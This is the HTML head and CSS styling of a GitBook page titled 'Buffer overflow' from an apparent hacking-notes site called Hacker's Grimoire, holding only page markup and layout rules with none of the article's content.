
    <!doctype html>
    <html >
        <head>
            <title data-react-helmet="true">Buffer overflow - Hacker&#x27;s Grimoire</title>
            <meta data-react-helmet="true" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/><meta data-react-helmet="true" charset="utf-8"/><meta data-react-helmet="true" name="google" value="notranslate"/><meta data-react-helmet="true" property="og:image" content="https://app.gitbook.com/share/space/thumbnail/-LMNRaGfniDGOexfu2Y6.png"/><meta data-react-helmet="true" property="twitter:card" content="summary"/><meta data-react-helmet="true" property="twitter:site" content="Hacker&#x27;s Grimoire"/><meta data-react-helmet="true" name="description" content=""/><meta data-react-helmet="true" property="og:title" content="Buffer overflow"/><meta data-react-helmet="true" property="og:description" content=""/>
            <link data-react-helmet="true" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500"/><link data-react-helmet="true" rel="stylesheet" href="https://unpkg.com/emojione-assets@4.0.0/sprites/emojione-sprite-40.min.css"/><link data-react-helmet="true" rel="preconnect" href="https://www.googleapis.com"/><link data-react-helmet="true" rel="preconnect" href="https://api.amplitude.com"/><link data-react-helmet="true" rel="preconnect" href="https://blobs.gitbook.com/"/><link data-react-helmet="true" rel="icon" href="https://blobs.gitbook.com/spaces%2F-LMNRaGfniDGOexfu2Y6%2Favatar.png?generation=1545335358292957&amp;alt=media"/><link data-react-helmet="true" rel="canonical" href="https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow"/><link data-react-helmet="true" rel="stylesheet" href="https://static.gitbook.com/css/6c3c9dec9383137845be0f0ea2cf1bf4.css"/>
            <style data-react-helmet="true" type="text/css">
        @font-face {
            font-family: "Roboto";
            src: local("Roboto"), local("Roboto-Regular"), url(https://static.gitbook.com/fonts/fc3d4b35e4d07d4e0485cc2db0e57c77.woff) format('woff');
            font-weight: 400;
            font-display: fallback;
        }
        @font-face {
            font-family: "Roboto";
            src: local("Roboto Medium"), local("Roboto-Medium"), url(https://static.gitbook.com/fonts/f4fa50c4003f87e7dc10459e500933c3.woff) format('woff');
            font-weight: 500;
            font-display: fallback;
        }
        @font-face {
            font-family: "Roboto";
            src: local("Roboto Bold"), local("Roboto-Bold"), url(https://static.gitbook.com/fonts/72e37e5bf95a8dba938c78b1d7d91253.woff) format('woff');
            font-weight: 700;
            font-display: fallback;
        }
    </style><style data-react-helmet="true" type="text/css">
        @font-face {
            font-family: "Content-font";
            src: local("Roboto"), local("Roboto-Regular"), url(https://static.gitbook.com/fonts/fc3d4b35e4d07d4e0485cc2db0e57c77.woff) format('woff');
            font-weight: 400;
            font-display: fallback;
        }
        @font-face {
            font-family: "Content-font";
            src: local("Roboto Medium"), local("Roboto-Medium"), url(https://static.gitbook.com/fonts/f4fa50c4003f87e7dc10459e500933c3.woff) format('woff');
            font-weight: 500;
            font-display: fallback;
        }
        @font-face {
            font-family: "Content-font";
            src: local("Roboto Bold"), local("Roboto-Bold"), url(https://static.gitbook.com/fonts/72e37e5bf95a8dba938c78b1d7d91253.woff) format('woff');
            font-weight: 700;
            font-display: fallback;
        }
    </style>
            <script data-react-helmet="true" type="text/javascript" defer="true" src="https://polyfill.io/v3/polyfill.min.js?flags=gated&amp;features=Intl"></script><script data-react-helmet="true" src="//cdn.iframe.ly/embed.js" async="true"></script>
            <style>#__GITBOOK__ROOT__SERVER__ { width: 100%; height: 100%; display: flex;}</style>
            <style>#__GITBOOK__ROOT__CLIENT__ { width: 100%; min-height: 100%; height: initial; display: flex;}</style>
            <style id="__GITBOOK__STYLE__">html, body {
  color: #242A31;
  width: 100%;
  height: 100%;
  margin: 0;
  padding: 0;
  font-size: 15px;
  background: #F5F7F9;
  box-sizing: border-box;
  font-family: "Roboto", sans-serif;
  line-height: 1em;
  font-smoothing: antialiased;
  text-size-adjust: 100%;
  -ms-text-size-adjust: 100%;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  -webkit-text-size-adjust: 100%;
}
@media screen and (min-width: 768px) {
  html, body {
    text-rendering: optimizeLegibility;
  }
}
@media print {
  html, body {
    background: transparent;
  }
}
*, *:before, *:after {
  outline: none;
  box-sizing: inherit;
}
@font-face {
  font-family: "Flow-Rounded";
  src: url("https://static.gitbook.com/fonts/bfc0a96537ceb0cad9e956b9f980fe88.woff") format('woff');
  font-display: block;
}
input, select, textarea {
  font-size: 16px;
}
input, select, textarea, button {
  font: inherit;
}
input[type="search"] {
  -webkit-appearance: none;
}
.draggingElement, .draggingElement *:hover {
  cursor: grabbing !important;
  pointer-events: auto !important;
}
.draggingElement .draggingHidden {
  display: none;
}

.reset-3c756112--body-68cac36c {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #242A31;
  width: 100%;
  margin: 0;
  display: flex;
  padding: 0;
  background: #F5F7F9;
  min-height: 100vh;
  flex-direction: column;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
}
.reset-3c756112--header-07037613--header-11420428 {
  display: -webkit-box;
  height: 80px;
  margin: 0;
  display: flex;
  padding: 0;
  z-index: 20;
  position: relative;
  box-shadow: 0 3px 8px 0 rgba(116, 129, 141, 0.1);
  border-bottom: 1px solid #d4dadf;
  background-color: #FFFFFF;
}
@media print {
  .reset-3c756112--header-07037613--header-11420428 {
    display: none;
  }
}
@media screen and (max-width: 1023px) {
  .reset-3c756112--header-07037613--header-11420428 {
    display: -webkit-box;
    display: -moz-box;
    display: -ms-flexbox;
    display: -webkit-flex;
    top: 0;
    width: 100%;
    display: flex;
    position: fixed;
    padding-left: 16px;
    padding-right: 16px;
  }
}
@media screen and (max-width: 767px) {
  .reset-3c756112--header-07037613--header-11420428 {
    height: 60px;
    padding-left: 8px;
    padding-right: 8px;
  }
}
.reset-3c756112--headerContainer-bb8cc0bc {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  width: 100%;
  margin: 0 auto;
  display: flex;
  padding: 0;
  max-width: 1448px;
}
.reset-3c756112--headerLeftColumn-4eae0bae--headerLeftColumn-7efc9f26 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  width: 100%;
  margin: 0;
  display: flex;
  padding: 0;
  position: relative;
  align-items: center;
  justify-content: space-between;
  -webkit-box-pack: justify;
  -webkit-box-align: center;
}
@media screen and (min-width: 1024px) {
  .reset-3c756112--headerLeftColumn-4eae0bae--headerLeftColumn-7efc9f26 {
    max-width: 298px;
    justify-content: center;
    -webkit-box-pack: center;
  }
  .reset-3c756112--headerLeftColumn-4eae0bae--headerLeftColumn-7efc9f26:after {
    top: 50%;
    right: 0;
    height: 40px;
    content: " ";
    position: absolute;
    transform: translateY(-50%);
    border-left: 1px solid #E6ECF1;
  }
}
.reset-3c756112--mobileButton-7a76d05f {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: 0 0 auto;
  width: 30px;
  cursor: pointer;
  height: 30px;
  margin: 0;
  display: flex;
  outline: none;
  padding: 0;
  font-size: 18px;
  align-items: center;
  justify-content: center;
  -webkit-box-pack: center;
  -webkit-box-align: center;
}
@media screen and (min-width: 1024px) {
  .reset-3c756112--mobileButton-7a76d05f {
    display: none;
  }
}
.icon-7f6730be--text-3f89f380--icon-1f8349b3 {
  color: #242A31;
  width: 1em;
  height: 1em;
  vertical-align: middle;
}
.reset-3c756112--headerLogo-5c0b38e2 {
  margin: 0;
  display: block;
  padding: 0px 24px;
}
@media screen and (min-width: 1024px) {
  .reset-3c756112--headerLogo-5c0b38e2 {
    width: 250px;
    padding: 0;
  }
}
.reset-3c756112--mobileLogo-dacfd15c {
  margin: 0;
  display: none;
  padding: 0;
}
@media screen and (max-width: 767px) {
  .reset-3c756112--mobileLogo-dacfd15c {
    display: block;
  }
}
.link-a079aa82--primary-53a25e66--logoLink-10d08504 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #3884FF;
  cursor: pointer;
  display: flex;
  align-items: center;
  text-decoration: none;
  -webkit-box-align: center;
}
.reset-3c756112--tooltipContainer-7fdb9b70--small-2ec8ae1a {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  width: 30px;
  height: 30px;
  margin: 0;
  display: flex;
  padding: 0;
  border-radius: 3px;
}
.reset-3c756112--avatarFrame-2f40cdc9--small-2ec8ae1a {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  -webkit-mask-image: -webkit-radial-gradient(white, black);
  -webkit-mask-image: -moz-radial-gradient(white, black);
  mask-image: -webkit-radial-gradient(white, black);
  mask-image: -moz-radial-gradient(white, black);
  width: 30px;
  height: 30px;
  margin: 0;
  display: flex;
  padding: 0;
  overflow: hidden;
  position: relative;
  mask-image: radial-gradient(white, black);
  align-items: center;
  border-radius: 3px;
  justify-content: center;
  -webkit-box-pack: center;
  -webkit-box-align: center;
  -webkit-mask-image: radial-gradient(white, black);
}
.image-67b14f24--avatar-1c1d03ec {
  width: 100%;
  height: 100%;
  max-width: 100%;
  background-size: cover;
  background-color: #FFFFFF;
  background-repeat: no-repeat;
}
.reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-6bd5cc81 {
  flex: 1;
  color: #242A31;
  margin: 0;
  display: block;
  padding: 0;
  padding-left: 8px;
}
@media screen and (max-width: 1023px) {
  .reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-6bd5cc81 {
    overflow: hidden;
    max-width: 50vw;
    white-space: nowrap;
    text-overflow: ellipsis;
  }
}
.reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-6bd5cc81:hover {
  color: #bf272e;
}
.text-4505230f--UIH400-4e41e82a--textContentFamily-49a318e1--spaceNameText-677c2969 {
  font-size: 16px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 500;
  line-height: 1.5;
  overflow-wrap: break-word;
}
.reset-3c756112--desktopLogo-a594db90 {
  margin: 0;
  display: block;
  padding: 0;
}
@media screen and (max-width: 767px) {
  .reset-3c756112--desktopLogo-a594db90 {
    display: none;
  }
}
.reset-3c756112--tooltipContainer-7fdb9b70--medium-296350e4 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  width: 40px;
  height: 40px;
  margin: 0;
  display: flex;
  padding: 0;
  border-radius: 3px;
}
.reset-3c756112--avatarFrame-2f40cdc9--medium-296350e4 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  -webkit-mask-image: -webkit-radial-gradient(white, black);
  -webkit-mask-image: -moz-radial-gradient(white, black);
  mask-image: -webkit-radial-gradient(white, black);
  mask-image: -moz-radial-gradient(white, black);
  width: 40px;
  height: 40px;
  margin: 0;
  display: flex;
  padding: 0;
  overflow: hidden;
  position: relative;
  mask-image: radial-gradient(white, black);
  align-items: center;
  border-radius: 3px;
  justify-content: center;
  -webkit-box-pack: center;
  -webkit-box-align: center;
  -webkit-mask-image: radial-gradient(white, black);
}
.reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea {
  flex: 1 1 auto;
  margin: 0px 88px;
  display: block;
  padding: 0;
  overflow: hidden;
  position: relative;
  max-width: 750px;
}
.reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea:after {
  background: -webkit-linear-gradient(to right, rgba(255,255,255,0) 0%, #FFFFFF 100%);
  background: -moz-linear-gradient(to right, rgba(255,255,255,0) 0%, #FFFFFF 100%);
  top: 0;
  right: 0;
  width: 32px;
  height: 100%;
  content: " ";
  position: absolute;
  background: linear-gradient(to right, rgba(255,255,255,0) 0%, #FFFFFF 100%);
  pointer-events: none;
}
@media screen and (max-width: 1439px) {
  .reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea {
    margin: 0px 24px 0px 88px;
  }
}
@media screen and (max-width: 1023px) {
  .reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea {
    display: none;
  }
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48 {
  display: -webkit-box;
  overflow-x: auto;
  height: 100%;
  margin: 0;
  display: flex;
  opacity: 1;
  padding: 0;
  overflow-x: overlay;
  overflow-y: hidden;
  transition: flex 250ms ease,width 250ms ease,opacity 250ms ease;
  -moz-transition: flex 250ms ease,width 250ms ease,opacity 250ms ease;
  -webkit-transition: flex 250ms ease,width 250ms ease,opacity 250ms ease;
  -webkit-overflow-scrolling: touch;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar {
  width: 4px;
  height: 4px;
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-track {
  background: none;
  border-width: 0;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-thumb {
  background: rgba(0,0,0,.16);
  transition: background 250ms ease;
  border-radius: 2px;
  -moz-transition: background 250ms ease;
  -webkit-transition: background 250ms ease;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-button {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-track-piece {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-corner {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-resizer {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48:hover::-webkit-scrollbar {
  display: initial;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48:hover::-webkit-scrollbar-thumb {
  background: rgba(0,0,0,.16);
}
.reset-3c756112--searchInputWrapper-ea7f3052--searchInputWrapper-0442d130 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  height: 80px;
  margin: 0;
  display: flex;
  padding: 0;
  position: relative;
  max-width: 224px;
  align-items: center;
  -webkit-box-align: center;
}
.reset-3c756112--searchInputWrapper-ea7f3052--searchInputWrapper-0442d130:before {
  top: 50%;
  left: 0;
  height: 40px;
  content: " ";
  position: absolute;
  transform: translateY(-50%);
  border-left: 1px solid #E6ECF1;
}
@media screen and (max-width: 1023px) {
  .reset-3c756112--searchInputWrapper-ea7f3052--searchInputWrapper-0442d130 {
    display: none;
  }
}
.reset-3c756112--inputContainer-b2cb171c {
  margin: 0;
  display: block;
  padding: 0;
  padding-left: 14px;
  padding-right: 16px;
}
.inputInner-5c86b87d--medium-0bbed4bd--inputInner-4216b016--searchInputPlaceholder-936306be {
  font: inherit;
  color: #242A31;
  width: 100%;
  border: none;
  cursor: inherit;
  height: 38px;
  margin: 0;
  resize: none;
  outline: none;
  padding: 0px 8px;
  background: transparent;
  box-sizing: border-box;
  text-align: left;
  line-height: inherit;
  border-radius: 3px;
}
.inputInner-5c86b87d--medium-0bbed4bd--inputInner-4216b016--searchInputPlaceholder-936306be::placeholder {
  color: #9DAAB6;
  font-size: 16px;
  font-weight: 500;
}
.reset-3c756112--inputWrapper-63396dac--TextH400-3033861f--medium-4505230f--light-502263b4--input-6d442051--searchInput-3fa812d5 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  width: 100%;
  border: none;
  margin: 0;
  display: flex;
  outline: none;
  padding: 0;
  font-size: 16px;
  background: #FFFFFF;
  box-sizing: border-box;
  font-weight: 400;
  line-height: 1.625;
  border-radius: 3px;
  background-color: #FFFFFF;
}
.reset-3c756112--inputInnerSizer-756c9114 {
  flex: 1;
  margin: 0;
  display: block;
  padding: 0;
}
.reset-3c756112--inputAddOn-45de9ec1--inputAddOnPrefix-202fa60d--icon-1f8349b3 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: 0 0 auto;
  color: #242A31;
  order: -1;
  margin: 0;
  display: flex;
  padding: 0;
  align-items: center;
  line-height: 1.2;
  white-space: nowrap;
  padding-left: 8px;
  -webkit-box-align: center;
}
.icon-7f6730be--text-3f89f380 {
  width: 1em;
  height: 1em;
  vertical-align: middle;
}
.reset-3c756112--bodyContent-2f98451b {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: 1;
  color: #3B454E;
  width: 100%;
  margin: 0 auto;
  display: flex;
  padding: 0;
}
.reset-3c756112--wholeContent-9fc567d4 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  width: 100%;
  margin: 0;
  display: flex;
  padding: 0;
  position: relative;
  min-height: 100%;
  flex-direction: column;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
}
.reset-3c756112--wholeContentBody-554be184 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: 1;
  margin: 0;
  display: flex;
  padding: 0;
  transition: margin-bottom 250ms ease;
  align-items: stretch;
  -moz-transition: margin-bottom 250ms ease;
  -webkit-box-align: stretch;
  -webkit-transition: margin-bottom 250ms ease;
}
@media screen and (max-width: 1023px) {
  .reset-3c756112--wholeContentBody-554be184 {
    padding-top: 80px;
  }
}
@media screen and (max-width: 767px) {
  .reset-3c756112--wholeContentBody-554be184 {
    padding-top: 60px;
  }
}
@keyframes keyframes-animation-2f81d449-0-1-375 {
  0% {
    background-color: rgba(24, 48, 85, 0);
  }
  100% {
    background-color: rgba(24, 48, 85, 0.30000000000000004);
  }
}
.reset-3c756112--backdrop-1322b68a--hidden-247382c3--overlay-29559ab8 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  margin: 0;
  display: flex;
  padding: 0;
  z-index: 29;
  position: absolute;
  transition: background-color 250ms ease-out;
  align-items: center;
  animation-name: none;
  pointer-events: none;
  -moz-transition: background-color 250ms ease-out;
  justify-content: center;
  -webkit-box-pack: center;
  background-color: rgba(24, 48, 85, 0);
  -webkit-box-align: center;
  -webkit-transition: background-color 250ms ease-out;
  animation-duration: 0.2s;
  animation-fill-mode: forwards;
  animation-timing-function: ease-out;
}
@media screen and (min-width: 1024px) {
  .reset-3c756112--backdrop-1322b68a--hidden-247382c3--overlay-29559ab8 {
    z-index: 14;
  }
}
.reset-3c756112--contentNavigation-dd3370a4 {
  margin: 0;
  display: block;
  padding: 0;
  z-index: 30;
}
@media print {
  .reset-3c756112--contentNavigation-dd3370a4 {
    display: none;
  }
}
@media screen and (min-width: 1024px) {
  .reset-3c756112--contentNavigation-dd3370a4 {
    display: -webkit-box;
    display: -moz-box;
    display: -ms-flexbox;
    display: -webkit-flex;
    flex: 0 0 auto;
    width: calc((100% - 1448px) / 2 + 298px);
    display: flex;
    z-index: 15;
    min-width: 298px;
    background: #F5F7F9;
    align-items: stretch;
    border-right: 1px solid #E6ECF1;
    padding-left: calc((100% - 1448px) / 2);
    flex-direction: column;
    -webkit-box-align: stretch;
    -webkit-box-orient: vertical;
    -webkit-box-direction: normal;
  }
}
.reset-3c756112--contentNavigationInner-205d49ea--contentNavigationInnerCollapsed-7b4aca00 {
  flex: 1;
  margin: 0;
  display: block;
  padding: 0;
}
@media screen and (max-width: 1023px) {
  .reset-3c756112--contentNavigationInner-205d49ea--contentNavigationInnerCollapsed-7b4aca00 {
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 30;
    position: fixed;
    max-width: 298px;
    transform: translateX(-100%) !important;
    box-shadow: none;
    overflow-y: auto;
    transition: transform 250ms ease;
    border-right: 1px solid #E6ECF1;
    -moz-transition: transform 250ms ease;
    background-color: #fff;
    -webkit-transition: transform 250ms ease;
  }
}
.reset-3c756112--sidebarWrapper-84a13d8e {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: auto;
  width: 100%;
  height: 100%;
  margin: 0;
  display: flex;
  padding: 0;
  align-items: stretch;
  flex-direction: column;
  -webkit-box-align: stretch;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
}
.reset-3c756112 {
  margin: 0;
  display: block;
  padding: 0;
}
.reset-3c756112--sidebar-84a13d8e {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: auto;
  width: 100%;
  height: 100%;
  margin: 0;
  display: flex;
  padding: 0;
  align-items: stretch;
  flex-direction: column;
  -webkit-box-align: stretch;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
}
.reset-3c756112--sidebarMain-13701e8f {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  height: 100%;
  margin: 0;
  display: flex;
  padding: 0;
  overflow-y: hidden;
  flex-direction: column;
  background-color: #F5F7F9;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe {
  overflow-y: auto;
  flex: 1 1 auto;
  width: 100%;
  margin: 0;
  display: block;
  padding: 0;
  overflow-x: hidden;
  overflow-y: overlay;
  -webkit-overflow-scrolling: touch;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar {
  width: 4px;
  height: 4px;
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-track {
  background: none;
  border-width: 0;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-thumb {
  background: rgba(0,0,0,.16);
  transition: background 250ms ease;
  border-radius: 2px;
  -moz-transition: background 250ms ease;
  -webkit-transition: background 250ms ease;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-button {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-track-piece {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-corner {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-resizer {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe:hover::-webkit-scrollbar {
  display: initial;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe:hover::-webkit-scrollbar-thumb {
  background: rgba(0,0,0,.16);
}
.reset-3c756112--mobileHeader-4e2d4892 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #74818D;
  height: 59px;
  margin: 0;
  display: flex;
  padding: 0;
  box-shadow: 0 1px 1px 0 rgba(116, 129, 141, 0.1);
  align-items: stretch;
  border-bottom: 1px solid #d4dadf;
  background-color: #FFFFFF;
  -webkit-box-align: stretch;
}
@media screen and (min-width: 768px) {
  .reset-3c756112--mobileHeader-4e2d4892 {
    display: none;
  }
}
.reset-3c756112--mobileHeaderClose-47b8fa64 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  cursor: pointer;
  margin: 0;
  display: flex;
  padding: 8px 16px;
  font-size: 24px;
  align-items: center;
  -webkit-box-align: center;
}
.reset-3c756112--pagesTree-4b07cd56 {
  margin: 0;
  display: block;
  padding: 0;
  font-size: 15px;
  margin-top: 32px;
  padding-left: 16px;
}
@media screen and (min-width: 768px) {
  .reset-3c756112--pagesTree-4b07cd56 {
    padding-left: 24px;
  }
}
.reset-3c756112--pageItem-01e3f344 {
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
  border-left: 1px solid transparent;
}
.reset-3c756112--pageComponent-7cc5301a {
  margin: 0;
  display: block;
  padding: 0;
  margin-left: -1px;
}
.navButton-94f2579c--navButtonClickable-161b88ca {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: inherit;
  border: 1px solid transparent;
  cursor: pointer;
  display: flex;
  padding: 7px 24px 7px 16px;
  position: relative;
  align-items: center;
  border-right: 0;
  text-decoration: none;
  -webkit-box-align: center;
}
.navButton-94f2579c--navButtonClickable-161b88ca:hover {
  background-color: #E6ECF1;
}
.text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f {
  flex: 1;
  font-size: 14px;
  word-break: break-word;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 500;
  line-height: 1.5;
}
.reset-3c756112--pageItemWithChildren-56f27afc {
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
}
.reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312 {
  color: #9DAAB6;
  cursor: pointer;
  margin: -8px;
  display: block;
  padding: 8px;
  position: relative;
  font-size: 18px;
  line-height: 1;
  margin-left: 0;
}
.reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312:hover {
  color: #5C6975;
}
.icon-7f6730be--text-3f89f380--pageDocumentIconExpanded-014d853c {
  width: 1em;
  height: 1em;
  transform: rotateZ(90deg);
  vertical-align: middle;
}
.reset-3c756112--pageChildren-56f27afc--pageDocumentChildren-2add00e7 {
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
  margin-left: 16px;
}
.reset-3c756112--pageChildren-56f27afc--pageDocumentChildren-2add00e7:before {
  top: 0;
  left: 0;
  width: 1px;
  bottom: 0;
  content: "";
  position: absolute;
  background: #E6ECF1;
}
.navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #9DAAB6;
  border: 1px solid transparent;
  cursor: pointer;
  display: flex;
  padding: 7px 24px 7px 16px;
  position: relative;
  align-items: center;
  border-right: 0;
  text-decoration: none;
  -webkit-box-align: center;
}
.navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca:hover {
  background-color: #E6ECF1;
}
.navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca--navButtonOpened-6a88552e {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #9DAAB6;
  border: 1px solid transparent;
  cursor: pointer;
  display: flex;
  padding: 7px 24px 7px 16px;
  position: relative;
  align-items: center;
  border-color: #E6ECF1 !important;
  border-right: 0;
  text-decoration: none;
  background-color: #FFFFFF;
  -webkit-box-align: center;
}
.navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca--navButtonOpened-6a88552e:hover {
  border-color: #E6ECF1;
  background-color: #FFFFFF;
}
.reset-3c756112--pageItemWithChildren-56f27afc--S300Bottom-9b4658d2 {
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
  margin-bottom: 24px;
}
.reset-3c756112--footer-68e6f18c {
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
}
.reset-3c756112--footer-68e6f18c:before {
  background: -webkit-linear-gradient(to bottom, rgba(255,255,255,0) 0%, #F5F7F9 100%);
  background: -moz-linear-gradient(to bottom, rgba(255,255,255,0) 0%, #F5F7F9 100%);
  top: -24px;
  width: 100%;
  height: 24px;
  content: "";
  display: block;
  position: absolute;
  background: linear-gradient(to bottom, rgba(255,255,255,0) 0%, #F5F7F9 100%);
}
.reset-3c756112--trademark-a8da4b94 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #9DAAB6;
  margin: 16px;
  display: flex;
  padding: 0;
  align-items: center;
  margin-left: 32px;
  padding-top: 8px;
  padding-left: 16px;
  border-radius: 3px;
  padding-right: 16px;
  padding-bottom: 8px;
  text-decoration: none;
  background-color: #E6ECF1;
  -webkit-box-align: center;
}
.reset-3c756112--trademark-a8da4b94:hover {
  color: #3884FF;
}
.reset-3c756112--trademarkLogo-0d2d53bc {
  margin: 0;
  display: block;
  padding: 0;
  font-size: 40px;
}
.reset-3c756112--trademarkContent-04a01aea {
  flex: 1;
  margin: 0;
  display: block;
  padding: 0;
  padding-left: 16px;
}
.text-4505230f--TextH200-a3425406--textUIFamily-5ebd8e40 {
  font-size: 12px;
  font-family: "Roboto", sans-serif;
  font-weight: 400;
  line-height: 1.625;
}
.reset-3c756112--wholeContentPage-6c3f1fc5 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: 1 1 auto;
  margin: 0;
  display: flex;
  padding: 0;
  max-width: 100%;
  min-width: 0;
  background: #fff;
  flex-direction: column;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
}
.reset-3c756112--wholePageSticky-f53dafd2 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: 1 1 auto;
  margin: 0;
  display: flex;
  padding: 0;
  position: relative;
  min-width: 0;
}
.reset-3c756112--pageContainer-3ec6d8d0 {
  flex: 1 1 auto;
  margin: 0px 16px;
  display: block;
  padding: 0;
  max-width: 750px;
  min-width: 0;
  padding-bottom: 64px;
}
@media screen and (max-width: 1023px) {
  .reset-3c756112--pageContainer-3ec6d8d0 {
    margin: 0px auto;
    padding: 0px 24px;
  }
}
